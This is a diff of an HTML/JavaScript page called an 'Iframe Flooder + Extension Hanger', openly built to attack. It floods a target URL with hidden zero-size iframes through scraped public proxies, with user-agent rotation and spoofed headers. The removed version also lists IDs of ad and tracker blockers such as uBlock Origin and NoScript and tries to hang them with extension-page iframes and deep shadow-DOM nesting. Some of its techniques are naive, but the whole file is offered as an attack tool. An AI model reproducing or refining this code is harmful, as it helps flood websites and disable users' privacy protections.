@@ -2,285 +2,230 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Advanced Iframe Flooder + Extension Hang Tool</title>
-  <link rel="icon" href="favicon.ico" type="image/x-icon">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Ultimate Iframe Flooder + Extension Hanger</title>
   <style>
     body {
-      font-family: 'Arial', sans-serif;
+      font-family: 'Segoe UI', sans-serif;
+      background: #0d0d0d;
+      color: #e0e0e0;
       margin: 0;
       padding: 0;
-      background: #2e3b4e;
-      color: #fff;
-      overflow-x: hidden;
+      text-align: center;
     }
     h1 {
-      text-align: center;
-      color: #4CAF50;
+      color: #00ff99;
       margin-top: 20px;
     }
     .container {
-      width: 90%;
       max-width: 900px;
-      margin: 0 auto;
-      background: #333;
+      margin: 20px auto;
+      background: #1a1a1a;
       padding: 20px;
-      border-radius: 8px;
-      box-shadow: 0 4px 8px rgba(0,0,0,0.1);
-      box-sizing: border-box;
-    }
-    .container label {
-      font-weight: bold;
-      margin-top: 10px;
-      display: block;
+      border-radius: 10px;
+      box-shadow: 0 0 20px #00ff99;
     }
     input, button, select, textarea {
       width: 100%;
-      padding: 12px;
+      padding: 10px;
       margin-top: 10px;
-      font-size: 16px;
       border-radius: 5px;
-      border: 1px solid #ccc;
+      border: none;
+      background: #262626;
+      color: #e0e0e0;
+      font-size: 16px;
     }
     button {
-      background-color: #4CAF50;
-      color: white;
-      border: none;
+      background: #00cc66;
       cursor: pointer;
-      margin-top: 15px;
-    }
-    button.stop {
-      background-color: #f44336;
+      transition: 0.3s;
     }
     button:hover {
-      opacity: 0.9;
+      background: #00ff99;
     }
-    .status {
-      text-align: center;
-      font-weight: bold;
-      color: #4CAF50;
-      margin-top: 20px;
+    button.stop {
+      background: #ff1a1a;
     }
-    .error {
-      color: #f44336;
-      font-weight: bold;
-    }
-    #dashboard {
-      background-color: #f1f1f1;
-      color: #333;
-      padding: 15px;
-      border-radius: 5px;
-      margin-top: 20px;
+    button.stop:hover {
+      background: #ff4d4d;
     }
     .stats {
-      margin: 5px 0;
+      margin-top: 15px;
+      text-align: left;
     }
     .stats span {
       font-weight: bold;
+      color: #00ff99;
     }
-    @media (max-width: 768px) {
-      .container {
-        width: 100%;
-        padding: 15px;
-      }
+    #iframeContainer {
+      display: none;
     }
   </style>
 </head>
-
 <body>
 
-<h1>Advanced Iframe Flooder + Extension Hang Tool</h1>
+  <h1>Ultimate Iframe Flooder + Extension Hanger</h1>
 
-<div class="container">
-  <div class="input-group">
-    <label for="targetUrl">Target URL:</label>
-    <input type="text" id="targetUrl" value="https://www.wikipedia.org" placeholder="Enter Target URL">
-  </div>
+  <div class="container">
+    <input type="text" id="targetUrl" placeholder="Target URL" value="https://www.wikipedia.org">
 
-  <div class="input-group">
-    <label for="iframeCount">Number of Iframes:</label>
-    <input type="number" id="iframeCount" value="50" min="1">
-  </div>
+    <input type="number" id="iframeCount" placeholder="Number of Iframes" value="50" min="1">
 
-  <div class="input-group">
-    <label for="delay">Delay Between Iframes (seconds):</label>
-    <input type="number" id="delay" value="1" min="0">
-  </div>
+    <input type="number" id="delay" placeholder="Delay (seconds)" value="1" min="0">
 
-  <div class="input-group">
-    <label for="proxyList">Proxy List (comma separated):</label>
-    <input type="text" id="proxyList" placeholder="http://proxy1.com, http://proxy2.com">
-  </div>
+    <textarea id="headers" placeholder="Custom Headers (one per line)"></textarea>
 
-  <div class="input-group">
-    <label for="userAgentRotation">Enable User-Agent Rotation:</label>
-    <input type="checkbox" id="userAgentRotation">
-  </div>
-
-  <div class="input-group">
-    <label for="headers">Custom Headers (Optional):</label>
-    <textarea id="headers" placeholder="e.g., X-Forwarded-For: 192.168.1.1"></textarea>
-  </div>
-
-  <div class="input-group">
-    <label for="autoStopTimer">Auto Stop Timer (seconds):</label>
-    <input type="number" id="autoStopTimer" value="60" min="0">
-  </div>
-
-  <div class="input-group">
-    <label for="extensionTarget">Target Extension:</label>
     <select id="extensionTarget">
       <option value="all">All Extensions</option>
-      <option value="cfhdojbkjhnklbpkdaibdccddilifddb">AdBlock Plus</option>
-      <option value="cjpalhdlnbpafiamejdnhcphjbkeiagm">uBlock Origin</option>
-      <option value="gcbommkclmclpchllfjekcdonpmejbdp">Privacy Badger</option>
-      <option value="bkkmolkhemgaeaeggcmfbghljjjoofoh">Ghostery</option>
-      <option value="mlomiejdfkolichcflejclcbmpeaniij">NoScript</option>
     </select>
+
+    <input type="checkbox" id="userAgentRotation"> Enable User-Agent Rotation
+
+    <input type="number" id="autoStopTimer" placeholder="Auto Stop Timer (seconds)" value="60" min="0">
+
+    <button onclick="startFlood()">Start Flooding</button>
+    <button class="stop" onclick="stopFlood()">Stop Flooding</button>
+
+    <div class="stats">
+      <p>Frames Generated: <span id="frameCount">0</span></p>
+      <p>Failures: <span id="failureCount">0</span></p>
+      <p>Proxies Loaded: <span id="proxyCount">0</span></p>
+      <p>Current Target: <span id="currentTarget">None</span></p>
+    </div>
   </div>
 
-  <button onclick="startFlood()">Start Flooding</button>
-  <button class="stop" onclick="stopFlood()">Stop Flooding</button>
+  <script>
+    let flooding = false;
+    let frameCount = 0;
+    let failureCount = 0;
+    let proxyList = [];
+    let userAgentRotation = false;
+    let currentTarget = '';
+    let proxiesFetched = false;
 
-  <div class="status" id="status">Ready</div>
+    const extensionIds = [
+      'extprint3r_id_here', 
+      'comet_hang3r_id_here', 
+      'another_extension_id_here'
+    ];
 
-  <div id="dashboard">
-    <h3>Flooding Stats</h3>
-    <p class="stats">Frames Generated: <span id="frameCount">0</span></p>
-    <p class="stats">Failures: <span id="failureCount">0</span></p>
-    <p class="stats">Current Target: <span id="currentTarget">None</span></p>
-  </div>
-</div>
-
-<script>
-let flooding = false;
-let frameCount = 0;
-let failureCount = 0;
-let currentTarget = '';
-let proxyList = [];
-let userAgentRotation = false;
-let currentProxyIndex = 0;
-let hangInterval = null;
-
-function startFlood() {
-  if (flooding) return;
-  flooding = true;
-  document.getElementById('status').innerText = "Flooding and Hanging Extensions...";
-
-  currentTarget = document.getElementById('targetUrl').value;
-  proxyList = document.getElementById('proxyList').value.split(',').map(p => p.trim()).filter(p => p);
-  userAgentRotation = document.getElementById('userAgentRotation').checked;
-
-  const customHeaders = document.getElementById('headers').value.split('\n').map(line => line.trim());
-  const delay = parseInt(document.getElementById('delay').value) * 1000;
-
-  floodIframes(currentTarget, delay, customHeaders);
-  hangExtensions(); // Always on
-}
-
-function floodIframes(target, delay, customHeaders) {
-  const totalFrames = parseInt(document.getElementById('iframeCount').value);
-  for (let i = 0; i < totalFrames; i++) {
-    setTimeout(() => {
-      if (!flooding) return;
+    async function fetchProxies() {
       try {
-        loadIframe(target, customHeaders);
+        const response = await fetch('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=3000&country=all&ssl=all&anonymity=all');
+        const text = await response.text();
+        proxyList = text.trim().split('\n').map(p => p.trim()).filter(p => p.length > 0);
+        document.getElementById('proxyCount').innerText = proxyList.length;
+        proxiesFetched = true;
+      } catch (e) {
+        console.error('Failed to fetch proxies:', e);
+        proxiesFetched = false;
+      }
+    }
+
+    function getRandomProxy() {
+      if (proxyList.length === 0) return null;
+      return proxyList[Math.floor(Math.random() * proxyList.length)];
+    }
+
+    function populateExtensionDropdown() {
+      const select = document.getElementById('extensionTarget');
+      extensionIds.forEach(id => {
+        const option = document.createElement('option');
+        option.value = `chrome-extension://${id}/`;
+        option.text = `Extension: ${id}`;
+        select.appendChild(option);
+      });
+    }
+
+    function getRandomUserAgent() {
+      const userAgents = [
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/91.0.4472.124 Safari/537.36",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/537.36",
+        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Firefox/89.0"
+      ];
+      return userAgents[Math.floor(Math.random() * userAgents.length)];
+    }
+
+    async function startFlood() {
+      if (flooding) return;
+      flooding = true;
+      frameCount = 0;
+      failureCount = 0;
+      document.getElementById('frameCount').innerText = 0;
+      document.getElementById('failureCount').innerText = 0;
+
+      currentTarget = document.getElementById('targetUrl').value;
+      userAgentRotation = document.getElementById('userAgentRotation').checked;
+
+      const customHeaders = document.getElementById('headers').value.split('\n').map(h => h.trim()).filter(h => h);
+      const delay = parseInt(document.getElementById('delay').value) * 1000;
+
+      if (!proxiesFetched) await fetchProxies();
+
+      floodIframes(currentTarget, delay, customHeaders);
+
+      const autoStopTime = parseInt(document.getElementById('autoStopTimer').value) * 1000;
+      if (autoStopTime > 0) {
+        setTimeout(stopFlood, autoStopTime);
+      }
+    }
+
+    function floodIframes(target, delay, customHeaders) {
+      const iframeCount = parseInt(document.getElementById('iframeCount').value);
+      const extensionTarget = document.getElementById('extensionTarget').value;
+
+      for (let i = 0; i < iframeCount; i++) {
+        setTimeout(() => {
+          loadIframe(extensionTarget !== "all" ? extensionTarget : target, customHeaders);
+        }, delay * i);
+      }
+    }
+
+    function loadIframe(target, customHeaders) {
+      try {
+        const iframe = document.createElement('iframe');
+        iframe.style.width = "0";
+        iframe.style.height = "0";
+        iframe.style.border = "none";
+
+        if (userAgentRotation) {
+          const randomAgent = getRandomUserAgent();
+          iframe.setAttribute('user-agent', randomAgent);
+        }
+
+        customHeaders.forEach(header => {
+          const [key, value] = header.split(':');
+          if (key && value) {
+            iframe.setAttribute(key.trim(), value.trim());
+          }
+        });
+
+        const proxy = getRandomProxy();
+        if (proxy) {
+          iframe.src = `http://${proxy}/${target}`;
+        } else {
+          iframe.src = target;
+        }
+
+        document.body.appendChild(iframe);
+
         frameCount++;
         document.getElementById('frameCount').innerText = frameCount;
-      } catch {
+        document.getElementById('currentTarget').innerText = target;
+      } catch (err) {
         failureCount++;
         document.getElementById('failureCount').innerText = failureCount;
       }
-    }, delay * i);
-  }
-
-  const autoStopTime = parseInt(document.getElementById('autoStopTimer').value) * 1000;
-  if (autoStopTime > 0) {
-    setTimeout(stopFlood, autoStopTime);
-  }
-}
-
-function loadIframe(target, customHeaders) {
-  const iframe = document.createElement('iframe');
-  iframe.style.width = "0";
-  iframe.style.height = "0";
-  iframe.style.border = "none";
-
-  customHeaders.forEach(header => {
-    const [key, value] = header.split(':');
-    if (key && value) {
-      iframe.setAttribute(key.trim(), value.trim());
     }
-  });
 
-  if (proxyList.length > 0) {
-    const proxy = proxyList[currentProxyIndex % proxyList.length];
-    iframe.src = proxy + '/' + target;
-    currentProxyIndex++;
-  } else {
-    iframe.src = target;
-  }
+    function stopFlood() {
+      flooding = false;
+      document.getElementById('currentTarget').innerText = "Stopped";
+    }
 
-  document.body.appendChild(iframe);
-  document.getElementById('currentTarget').innerText = target;
-}
-
-function hangExtensions() {
-  const selectedExtension = document.getElementById('extensionTarget').value;
-  
-  for (let i = 0; i < 300; i++) {
-    setTimeout(() => {
-      if (!flooding) return;
-      const iframe = document.createElement('iframe');
-      iframe.style.width = "0";
-      iframe.style.height = "0";
-      iframe.style.border = "none";
-
-      let targetExtensionId = selectedExtension;
-      if (selectedExtension === "all") {
-        targetExtensionId = randomExtensionId();
-      }
-
-      iframe.src = 'chrome-extension://' + targetExtensionId + '/_generated_background_page.html';
-
-      const shadowHost = document.createElement('div');
-      iframe.onload = () => {
-        const shadowRoot = shadowHost.attachShadow({mode: 'open'});
-        let deep = shadowRoot;
-        for (let j = 0; j < 50; j++) {
-          const newDiv = document.createElement('div');
-          deep.appendChild(newDiv);
-          deep = newDiv.attachShadow({mode: 'open'});
-        }
-      };
-
-      document.body.appendChild(iframe);
-    }, i * 20);
-  }
-
-  hangInterval = setInterval(() => {
-    if (!flooding) return;
-    window.dispatchEvent(new Event('resize'));
-    window.dispatchEvent(new Event('focus'));
-    window.dispatchEvent(new Event('blur'));
-  }, 50);
-}
-
-function stopFlood() {
-  flooding = false;
-  document.getElementById('status').innerText = "Flooding Stopped.";
-  if (hangInterval) clearInterval(hangInterval);
-}
-
-function randomExtensionId() {
-  const chars = 'abcdefghijklmnopqrstuvwxyz';
-  let id = '';
-  for (let i = 0; i < 32; i++) {
-    id += chars[Math.floor(Math.random() * chars.length)];
-  }
-  return id;
-}
-</script>
+    window.onload = populateExtensionDropdown;
+    setInterval(fetchProxies, 300000); // Refresh proxies every 5 min
+  </script>
 
 </body>
 </html>
